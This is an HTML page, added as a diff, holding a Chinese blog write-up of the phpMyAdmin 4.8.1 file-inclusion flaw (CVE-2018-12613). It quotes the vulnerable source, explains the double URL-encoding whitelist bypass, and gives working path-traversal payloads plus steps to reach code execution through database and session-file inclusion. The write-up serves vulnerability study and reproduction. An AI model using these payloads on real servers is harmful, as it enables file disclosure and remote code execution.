@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>phpmyadmin任意包含文件漏洞及任意代码执行漏洞(CVE-2018-12613) | Hexo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="phpmyadmin任意包含文件漏洞及任意代码执行漏洞打开页面后，用御剑对网址进行扫描，发现http:&#x2F;&#x2F;url&#x2F;phpmyadmin&#x2F;可以进入到phpmyadmin的界面中，此时我们可以想到phpmyadmin4.8.1的任意包含漏洞及任意执行代码漏洞，可以从网址：https:&#x2F;&#x2F;files.phpmyadmin.net&#x2F;phpMyAdmin&#x2F;4.8.1&#x2F;phpMyAdmin-4.8.1-all">
+<meta property="og:type" content="article">
+<meta property="og:title" content="phpmyadmin任意包含文件漏洞及任意代码执行漏洞(CVE-2018-12613)">
+<meta property="og:url" content="http://example.com/2021/08/31/phpmyadmin%E4%BB%BB%E6%84%8F%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%8F%8A%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="phpmyadmin任意包含文件漏洞及任意代码执行漏洞打开页面后，用御剑对网址进行扫描，发现http:&#x2F;&#x2F;url&#x2F;phpmyadmin&#x2F;可以进入到phpmyadmin的界面中，此时我们可以想到phpmyadmin4.8.1的任意包含漏洞及任意执行代码漏洞，可以从网址：https:&#x2F;&#x2F;files.phpmyadmin.net&#x2F;phpMyAdmin&#x2F;4.8.1&#x2F;phpMyAdmin-4.8.1-all">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-08-30T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-08-31T15:20:53.054Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="代码审计">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e4dde71190ef76c61d3907c89516fdfaae51676e.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/"></a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						<div class="icon-wrap icon-link hide" data-idx="2">
+							<div class="loopback_l"></div>
+							<div class="loopback_r"></div>
+						</div>
+						
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>标签</li>
+						
+						<li>友情链接</li>
+						
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/http/" style="font-size: 11.67px;">http</a> <a href="/tags/java/" style="font-size: 10px;">java</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 13.33px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.33px;">sql注入</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 16.67px;">脚本编写</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e4dde71190ef76c61d3907c89516fdfaae51676e.jpg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-phpmyadmin任意包含文件漏洞及任意代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/08/31/phpmyadmin%E4%BB%BB%E6%84%8F%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%8F%8A%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  	<time datetime="2021-08-30T16:00:00.000Z" itemprop="datePublished">2021-08-31</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      phpmyadmin任意包含文件漏洞及任意代码执行漏洞(CVE-2018-12613)
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="phpmyadmin任意包含文件漏洞及任意代码执行漏洞"><a href="#phpmyadmin任意包含文件漏洞及任意代码执行漏洞" class="headerlink" title="phpmyadmin任意包含文件漏洞及任意代码执行漏洞"></a>phpmyadmin任意包含文件漏洞及任意代码执行漏洞</h1><p>打开页面后，用御剑对网址进行扫描，发现<a target="_blank" rel="noopener" href="http://url/phpmyadmin/%E5%8F%AF%E4%BB%A5%E8%BF%9B%E5%85%A5%E5%88%B0phpmyadmin%E7%9A%84%E7%95%8C%E9%9D%A2%E4%B8%AD%EF%BC%8C%E6%AD%A4%E6%97%B6%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E6%83%B3%E5%88%B0phpmyadmin4.8.1%E7%9A%84%E4%BB%BB%E6%84%8F%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%8F%8A%E4%BB%BB%E6%84%8F%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%EF%BC%8C%E5%8F%AF%E4%BB%A5%E4%BB%8E%E7%BD%91%E5%9D%80%EF%BC%9Ahttps://files.phpmyadmin.net/phpMyAdmin/4.8.1/phpMyAdmin-4.8.1-all-languages.zip%E4%B8%AD%E4%B8%8B%E8%BD%BD%E6%9C%AC%E5%9C%B0%EF%BC%8C%E7%84%B6%E5%90%8E%E7%94%A8php5.6%E7%89%88%E6%9C%AC%E8%BF%9B%E8%A1%8C%E5%A4%8D%E7%8E%B0">http://url/phpmyadmin/可以进入到phpmyadmin的界面中，此时我们可以想到phpmyadmin4.8.1的任意包含漏洞及任意执行代码漏洞，可以从网址：https://files.phpmyadmin.net/phpMyAdmin/4.8.1/phpMyAdmin-4.8.1-all-languages.zip中下载本地，然后用php5.6版本进行复现</a></p>
+<p>通过审计源码<br>我们可以从index.php文件中50-63行代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$target_blacklist = array (</span><br><span class="line">    &#x27;import.php&#x27;, &#x27;export.php&#x27;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">// If we have a valid target, let&#x27;s load that script instead</span><br><span class="line">if (! empty($_REQUEST[&#x27;target&#x27;])</span><br><span class="line">    &amp;&amp; is_string($_REQUEST[&#x27;target&#x27;])</span><br><span class="line">    &amp;&amp; ! preg_match(&#x27;/^index/&#x27;, $_REQUEST[&#x27;target&#x27;])</span><br><span class="line">    &amp;&amp; ! in_array($_REQUEST[&#x27;target&#x27;], $target_blacklist)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity($_REQUEST[&#x27;target&#x27;])</span><br><span class="line">) &#123;</span><br><span class="line">    include $_REQUEST[&#x27;target&#x27;];</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>发现只要满足一下五个条件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. $_REQUEST[&#x27;target&#x27;]不为空</span><br><span class="line"></span><br><span class="line">2. $_REQUEST[&#x27;target&#x27;]是字符串</span><br><span class="line"></span><br><span class="line">3. $_REQUEST[&#x27;target&#x27;]不以index开头</span><br><span class="line"></span><br><span class="line">4. $_REQUEST[&#x27;target&#x27;]含有的文件不在$target_blacklist=array(&#x27;import.php&#x27;,&#x27;export.php&#x27;)中</span><br><span class="line"></span><br><span class="line">5. Core::checkPageValidity($_REQUEST[&#x27;target&#x27;])为真</span><br></pre></td></tr></table></figure>
+
+<p>而在libraries\classes\Core.php 443-476行的代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">public static function checkPageValidity(&amp;$page, array $whitelist = [])</span><br><span class="line">    &#123;</span><br><span class="line">        if (empty($whitelist)) &#123;</span><br><span class="line">            $whitelist = self::$goto_whitelist;</span><br><span class="line">        &#125;</span><br><span class="line">        if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (in_array($page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_page = mb_substr(</span><br><span class="line">            $page,</span><br><span class="line">            0,</span><br><span class="line">            mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_page = urldecode($page);</span><br><span class="line">        $_page = mb_substr(</span><br><span class="line">            $_page,</span><br><span class="line">            0,</span><br><span class="line">            mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>其中如果$whilelist为空的话，会自动导入$goto_whilelist</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">public static $goto_whitelist = array(</span><br><span class="line">        &#x27;db_datadict.php&#x27;,</span><br><span class="line">        &#x27;db_sql.php&#x27;,</span><br><span class="line">        &#x27;db_events.php&#x27;,</span><br><span class="line">        &#x27;db_export.php&#x27;,</span><br><span class="line">        &#x27;db_importdocsql.php&#x27;,</span><br><span class="line">        &#x27;db_multi_table_query.php&#x27;,</span><br><span class="line">        &#x27;db_structure.php&#x27;,</span><br><span class="line">        &#x27;db_import.php&#x27;,</span><br><span class="line">        &#x27;db_operations.php&#x27;,</span><br><span class="line">        &#x27;db_search.php&#x27;,</span><br><span class="line">        &#x27;db_routines.php&#x27;,</span><br><span class="line">        &#x27;export.php&#x27;,</span><br><span class="line">        &#x27;import.php&#x27;,</span><br><span class="line">        &#x27;index.php&#x27;,</span><br><span class="line">        &#x27;pdf_pages.php&#x27;,</span><br><span class="line">        &#x27;pdf_schema.php&#x27;,</span><br><span class="line">        &#x27;server_binlog.php&#x27;,</span><br><span class="line">        &#x27;server_collations.php&#x27;,</span><br><span class="line">        &#x27;server_databases.php&#x27;,</span><br><span class="line">        &#x27;server_engines.php&#x27;,</span><br><span class="line">        &#x27;server_export.php&#x27;,</span><br><span class="line">        &#x27;server_import.php&#x27;,</span><br><span class="line">        &#x27;server_privileges.php&#x27;,</span><br><span class="line">        &#x27;server_sql.php&#x27;,</span><br><span class="line">        &#x27;server_status.php&#x27;,</span><br><span class="line">        &#x27;server_status_advisor.php&#x27;,</span><br><span class="line">        &#x27;server_status_monitor.php&#x27;,</span><br><span class="line">        &#x27;server_status_queries.php&#x27;,</span><br><span class="line">        &#x27;server_status_variables.php&#x27;,</span><br><span class="line">        &#x27;server_variables.php&#x27;,</span><br><span class="line">        &#x27;sql.php&#x27;,</span><br><span class="line">        &#x27;tbl_addfield.php&#x27;,</span><br><span class="line">        &#x27;tbl_change.php&#x27;,</span><br><span class="line">        &#x27;tbl_create.php&#x27;,</span><br><span class="line">        &#x27;tbl_import.php&#x27;,</span><br><span class="line">        &#x27;tbl_indexes.php&#x27;,</span><br><span class="line">        &#x27;tbl_sql.php&#x27;,</span><br><span class="line">        &#x27;tbl_export.php&#x27;,</span><br><span class="line">        &#x27;tbl_operations.php&#x27;,</span><br><span class="line">        &#x27;tbl_structure.php&#x27;,</span><br><span class="line">        &#x27;tbl_relation.php&#x27;,</span><br><span class="line">        &#x27;tbl_replace.php&#x27;,</span><br><span class="line">        &#x27;tbl_row_action.php&#x27;,</span><br><span class="line">        &#x27;tbl_select.php&#x27;,</span><br><span class="line">        &#x27;tbl_zoom_select.php&#x27;,</span><br><span class="line">        &#x27;transformation_overview.php&#x27;,</span><br><span class="line">        &#x27;transformation_wrapper.php&#x27;,</span><br><span class="line">        &#x27;user_password.php&#x27;,</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<p>mb_strpos</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">格式：mb_strpos ( string $haystack , string $needle [, int $offset = 0 [, string $encoding = mb_internal_encoding() ]] )</span><br><span class="line"></span><br><span class="line">含义：int查找 string 在一个 string 中首次出现的位置。基于字符数执行一个多字节安全的 strpos() 操作。 第一个字符的位置是 0，第二个字符的位置是 1，以此类推</span><br></pre></td></tr></table></figure>
+
+<p>$_page是取出$page问号前的东西，是考虑到target有参数的情况的话，只要$_page在白名单里面就会返回ture，所以如果第一个步骤不成功的话，还会进行一次url解码，再次进行相同的判断</p>
+<p>由于服务器会自动进行一次url解码，所以我们传入二次编码后，会触发checkPageValidity()函数中url解码后的判断，判断问号前面的文件是否在白名单中，在的话返回true,因此构造payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">一开始：?index.php?target=db_dataict.php%253f/../../../文件名</span><br><span class="line"></span><br><span class="line">服务器url解码后：?index.php?target=db_dataict.php%3f/../../../文件名</span><br><span class="line"></span><br><span class="line">checkPageValidity()函数里的url解码后·：?index.php?target=db_dataict.php?/../../../文件名</span><br></pre></td></tr></table></figure>
+<p>但是在index.php中$_REQUEST[‘target’]仍然是db_datadict.php%3f，而且会被include，通过目录穿越，造成任意文件包含</p>
+<h2 id="任意文件包含"><a href="#任意文件包含" class="headerlink" title="任意文件包含"></a>任意文件包含</h2><h3 id="通过目录穿越看系统目录下的文件"><a href="#通过目录穿越看系统目录下的文件" class="headerlink" title="通过目录穿越看系统目录下的文件"></a>通过目录穿越看系统目录下的文件</h3><p>构造payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?target=db_datadict.php%253f/../../../文件名</span><br></pre></td></tr></table></figure>
+<p>其中../的数量看实际情况</p>
+<h2 id="任意代码执行"><a href="#任意代码执行" class="headerlink" title="任意代码执行"></a>任意代码执行</h2><h3 id="包含数据库中的文件-include包含文件，如果文件是php文件的话，则会执行，如果不是，则会返回文件中的内容）"><a href="#包含数据库中的文件-include包含文件，如果文件是php文件的话，则会执行，如果不是，则会返回文件中的内容）" class="headerlink" title="包含数据库中的文件(include包含文件，如果文件是php文件的话，则会执行，如果不是，则会返回文件中的内容）"></a>包含数据库中的文件(include包含文件，如果文件是php文件的话，则会执行，如果不是，则会返回文件中的内容）</h3><p>先查一下数据库的路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &quot;%datadir%&quot;</span><br></pre></td></tr></table></figure>
+<p>而后创建数据库及库中的表及表中的字段内容，内容可以为php代码，之后构造payload进行文件包含，并执行恶意代码</p>
+<h3 id="包含session文件"><a href="#包含session文件" class="headerlink" title="包含session文件"></a>包含session文件</h3><p>session文件路径以实际为主<br>构造sql语句并夹杂恶意代码，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &quot;php代码&quot;</span><br></pre></td></tr></table></figure>
+<p>而后可以使用火狐的web开发者工具中的存储选项中的cookie值中phpmyadmin中的value值，这是生成的session文件名，一般存储位置为上面的数据库路径中的mysql/data改为temp/temp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?target=db_datadict.php%253f/../../../按实际情况定/按实际情况定/temp/temp/sess_cookie中的phpmyadmin中的value值</span><br></pre></td></tr></table></figure>
+<p>而其中../以实际为主，要一个一个试</p>
+<p>详细请看：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/leixiao-/p/10265150.html#autoid-1-0-0">https://www.cnblogs.com/leixiao-/p/10265150.html#autoid-1-0-0</a></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2021/08/30/java%E7%9A%84WEB-INF/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">java的WEB-INF</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="ds-share share" data-thread-key="phpmyadmin任意包含文件漏洞及任意代码执行漏洞" data-title="phpmyadmin任意包含文件漏洞及任意代码执行漏洞(CVE-2018-12613)" data-url="http://example.com/2021/08/31/phpmyadmin%E4%BB%BB%E6%84%8F%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%8F%8A%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"  data-images="https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e4dde71190ef76c61d3907c89516fdfaae51676e.jpg" data-content="phpmyadmin任意包含文件漏洞及任意代码执行漏洞(CVE-2018-12613)">
+    <div class="ds-share-inline">
+      <ul  class="ds-share-icons-16">
+      	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+      </ul>
+      <div class="ds-share-icons-more">
+      </div>
+    </div>
+ </div>
+ 
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2021 John Doe
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>
+
+
+  </div>
+</body>
+</html>
